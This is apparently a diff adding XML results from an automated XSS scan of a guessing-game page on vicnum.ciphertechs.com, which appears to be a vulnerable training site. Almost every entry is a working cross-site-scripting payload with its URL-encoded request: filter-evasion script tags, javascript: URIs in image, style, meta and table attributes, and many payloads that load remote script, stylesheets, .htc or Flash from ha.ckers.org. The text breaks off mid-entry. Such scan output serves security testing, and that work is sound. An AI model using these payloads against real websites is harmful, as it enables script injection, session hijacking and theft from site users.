+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIMG+SRC%3D%22+%26%2314%3B+javascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT></parameter>
+	<type name='XSS Injection Type'>Non-Alpha/Non-Digit</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSCRIPT%2FXSS+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><SCRIPT SRC=http://ha.ckers.org/xss.js</parameter>
+	<type name='XSS Injection Type'>No Closing Script Tag</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><SCRIPT SRC=//ha.ckers.org/.j></parameter>
+	<type name='XSS Injection Type'>Protocol resolution in script tags</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSCRIPT+SRC%3D%2F%2Fha.ckers.org%2F.j%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IMG SRC="javascript:alert('XSS')"</parameter>
+	<type name='XSS Injection Type'>Half-Open HTML/JavaScript</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IFRAME SRC=http://ha.ckers.org/scriptlet.html <</parameter>
+	<type name='XSS Injection Type'>Double open angle brackets</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIFRAME+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fscriptlet.html+%3C</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><<SCRIPT>alert("XSS");//<</SCRIPT></parameter>
+	<type name='XSS Injection Type'>Extraneous Open Brackets</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%3C%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><IMG """><SCRIPT>alert("XSS")</SCRIPT>"></parameter>
+	<type name='XSS Injection Type'>Malformed IMG Tags</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><SCRIPT>a=/XSS/ alert(a.source)</SCRIPT></parameter>
+	<type name='XSS Injection Type'>No Quotes/Semicolons</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSCRIPT%3Ea%3D%2FXSS%2F+alert%28a.source%29%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT></parameter>
+	<type name='XSS Injection Type'>Evade Regex Filter 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSCRIPT+a%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"></SCRIPT></parameter>
+	<type name='XSS Injection Type'>Evade Regex Filter 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSCRIPT+%3D%22blah%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><SCRIPT a="blah" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT></parameter>
+	<type name='XSS Injection Type'>Evade Regex Filter 3</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSCRIPT+a%3D%22blah%22+%27%27+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT></parameter>
+	<type name='XSS Injection Type'>Evade Regex Filter 4</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSCRIPT+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT></parameter>
+	<type name='XSS Injection Type'>Evade Regex Filter 5</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSCRIPT+a%3D%60%3E%60+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT></parameter>
+	<type name='XSS Injection Type'>Filter Evasion 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C%2FSCRIPT%3EPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT></parameter>
+	<type name='XSS Injection Type'>Filter Evasion 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CSCRIPT+a%3D%22%3E%27%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><A HREF="http://66.102.7.147/">XSS</A></parameter>
+	<type name='XSS Injection Type'>IP Encoding</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CA+HREF%3D%22http%3A%2F%2F66.102.7.147%2F%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><A HREF="//www.google.com/">XSS</A></parameter>
+	<type name='XSS Injection Type'>Protocol Resolution Bypass</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CA+HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><A HREF="//google">XSS</A></parameter>
+	<type name='XSS Injection Type'>Firefox Lookups 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CA+HREF%3D%22%2F%2Fgoogle%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><A HREF="http://ha.ckers.org@google">XSS</A></parameter>
+	<type name='XSS Injection Type'>Firefox Lookups 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CA+HREF%3D%22http%3A%2F%2Fha.ckers.org%40google%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><A HREF="http://google:ha.ckers.org">XSS</A></parameter>
+	<type name='XSS Injection Type'>Firefox Lookups 3</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CA+HREF%3D%22http%3A%2F%2Fgoogle%3Aha.ckers.org%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><A HREF="http://google.com/">XSS</A></parameter>
+	<type name='XSS Injection Type'>Removing Cnames</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CA+HREF%3D%22http%3A%2F%2Fgoogle.com%2F%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><A HREF="http://www.google.com./">XSS</A></parameter>
+	<type name='XSS Injection Type'>Extra dot for Absolute DNS</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CA+HREF%3D%22http%3A%2F%2Fwww.google.com.%2F%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><A HREF="javascript:document.location='http://www.google.com/'">XSS</A></parameter>
+	<type name='XSS Injection Type'>JavaScript Link Location</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CA+HREF%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2Fwww.google.com%2F%27%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='admin'><A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A></parameter>
+	<type name='XSS Injection Type'>Content Replace</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?admin=%3CA+HREF%3D%22http%3A%2F%2Fwww.gohttp%3A%2F%2Fwww.google.com%2Fogle.com%2F%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>SCRIPT w/Alert()</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E&admin=%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>SCRIPT w/Source File</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E&admin=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>SCRIPT w/Char Code</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E&admin=%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>BASE</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E&admin=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>BGSOUND</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&admin=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>DIV background-image 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E&admin=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>DIV background-image 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E&admin=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>DIV expression</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E&admin=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>IFRAME</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E&admin=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>INPUT Image</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CINPUT+TYPE%3D%22IMAGE%22+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&admin=%3CINPUT+TYPE%3D%22IMAGE%22+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>IMG w/JavaScript Directive</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&admin=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>IMG No Quotes/Semicolon</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E&admin=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>IMG Dynsrc</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&admin=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>IMG Lowsrc</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&admin=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>IMG Embedded commands 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E&admin=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>IMG Embedded commands 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26deleteuser&admin=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26deleteuser&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>List-style-image</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS&admin=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>IMG w/VBscript</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%27vbscript%3Amsgbox%28%22XSS%22%29%27%3E&admin=%3CIMG+SRC%3D%27vbscript%3Amsgbox%28%22XSS%22%29%27%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>LAYER</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CLAYER+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FLAYER%3E&admin=%3CLAYER+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FLAYER%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Livescript</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E&admin=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>META</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E&admin=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Mocha</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%22mocha%3A%5Bcode%5D%22%3E&admin=%3CIMG+SRC%3D%22mocha%3A%5Bcode%5D%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>OBJECT</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3COBJECT+TYPE%3D%22text%2Fx-scriptlet%22+DATA%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FOBJECT%3E&admin=%3COBJECT+TYPE%3D%22text%2Fx-scriptlet%22+DATA%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FOBJECT%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Embed Flash</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E&admin=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>STYLE</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSTYLE+TYPE%3D%22text%2Fjavascript%22%3Ealert%28%27XSS%27%29%3B%3C%2FSTYLE%3E&admin=%3CSTYLE+TYPE%3D%22text%2Fjavascript%22%3Ealert%28%27XSS%27%29%3B%3C%2FSTYLE%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>STYLE w/Anonymous HTML</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CXSS+STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E&admin=%3CXSS+STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>STYLE w/background-image</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSTYLE%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CA+CLASS%3DXSS%3E%3C%2FA%3E&admin=%3CSTYLE%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CA+CLASS%3DXSS%3E%3C%2FA%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>STYLE w/background</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E&admin=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Stylesheet</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&admin=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Remote Stylesheet 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.css%22%3E&admin=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.css%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Remote Stylesheet 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSTYLE%3E%40import%27http%3A%2F%2Fha.ckers.org%2Fxss.css%27%3B%3C%2FSTYLE%3E&admin=%3CSTYLE%3E%40import%27http%3A%2F%2Fha.ckers.org%2Fxss.css%27%3B%3C%2FSTYLE%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Remote Stylesheet 3</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CMETA+HTTP-EQUIV%3D%22Link%22+Content%3D%22%3Chttp%3A%2F%2Fha.ckers.org%2Fxss.css%3E%3B+REL%3Dstylesheet%22%3E&admin=%3CMETA+HTTP-EQUIV%3D%22Link%22+Content%3D%22%3Chttp%3A%2F%2Fha.ckers.org%2Fxss.css%3E%3B+REL%3Dstylesheet%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Remote Stylesheet 4</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSTYLE%3EBODY%7B-moz-binding%3Aurl%28%22http%3A%2F%2Fha.ckers.org%2Fxssmoz.xml%23xss%22%29%7D%3C%2FSTYLE%3E&admin=%3CSTYLE%3EBODY%7B-moz-binding%3Aurl%28%22http%3A%2F%2Fha.ckers.org%2Fxssmoz.xml%23xss%22%29%7D%3C%2FSTYLE%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>TD</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CTABLE%3E%3CTD+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTD%3E%3C%2FTABLE%3E&admin=%3CTABLE%3E%3CTD+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTD%3E%3C%2FTABLE%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>XML namespace</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CHTML+xmlns%3Axss%3E+%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.htc%22%3E+%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E+%3C%2FHTML%3E&admin=%3CHTML+xmlns%3Axss%3E+%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.htc%22%3E+%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E+%3C%2FHTML%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Local .htc file</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CXSS+STYLE%3D%22behavior%3A+url%28http%3A%2F%2Fha.ckers.org%2Fxss.htc%29%3B%22%3E&admin=%3CXSS+STYLE%3D%22behavior%3A+url%28http%3A%2F%2Fha.ckers.org%2Fxss.htc%29%3B%22%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>Rename .js to .jpg</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.jpg%22%3E%3C%2FSCRIPT%3E&admin=%3CSCRIPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.jpg%22%3E%3C%2FSCRIPT%3E&</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<type name='XSS Injection Type'>SSI</type>
